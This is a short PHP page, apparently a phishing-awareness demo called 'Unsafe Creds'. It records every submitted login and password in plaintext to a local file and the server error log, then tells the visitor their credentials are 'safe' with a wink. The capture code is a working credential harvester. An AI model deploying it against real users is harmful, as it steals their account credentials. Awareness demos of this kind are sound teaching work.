<?php

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method Not Allowed');
}

$dataDir = __DIR__ . '/data';

if (!is_dir($dataDir)) {
    mkdir($dataDir, 0775, true);
}

$login = (string) ($_POST['login'] ?? '');
$password = (string) ($_POST['password'] ?? '');

/*
 * Keep each submission on a single log line even if a request
 * bypasses the HTML form validation.
 */
$login = str_replace(["\r", "\n"], '', $login);
$password = str_replace(["\r", "\n"], '', $password);

$date = date('Y-m-d H:i:s');

$entry =
    $date .
    " | login: " . $login .
    " | password: " . $password .
    PHP_EOL;

file_put_contents(
    $dataDir . '/submits.txt',
    $entry,
    FILE_APPEND | LOCK_EX
);

error_log(
    "[$date] Login: $login | Password: $password"
);

?>
<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Login</title>

    <link rel="icon" href="favicon.ico" type="image/x-icon">

    <style>

        * {
            box-sizing: border-box;
        }

        html,
        body {
            margin: 0;
            min-height: 100%;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
        }

        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 30px 16px;
        }

        .container {
            width: 100%;
            max-width: 520px;
            text-align: center;
            background-color: white;
            padding: 40px 24px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
        }

        h1 {
            font-size: 30px;
            margin-top: 0;
            margin-bottom: 35px;
        }

        button {
            padding: 15px 30px;
            font-size: 20px;
            font-weight: bold;
            color: white;
            background-color: #007bff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }

        footer {
            width: 100%;
            padding: 18px 16px;
            text-align: center;
            font-size: 14px;
            color: #666;
        }

        footer a {
            color: #007bff;
            text-decoration: none;
            font-weight: bold;
        }

        footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 520px) {

            .container {
                padding: 30px 20px;
            }

            h1 {
                font-size: 26px;
            }

            footer {
                font-size: 13px;
            }
        }

    </style>

</head>

<body>

    <main>

        <div class="container">

            <h1>
                You successfully logged in!<br><br>
                Your credentials are "safe" for sure... ;)
            </h1>

            <button
                type="button"
                onclick="window.location.href='index.html'"
            >
                Back
            </button>

        </div>

    </main>

<footer>
  Unsafe Creds &bull; Copyright &copy; 2026
  <a
    href="https://github.com/christofrancis"
    target="_blank"
    rel="noopener noreferrer"
  >christofrancis</a>
</footer>

</body>

</html>
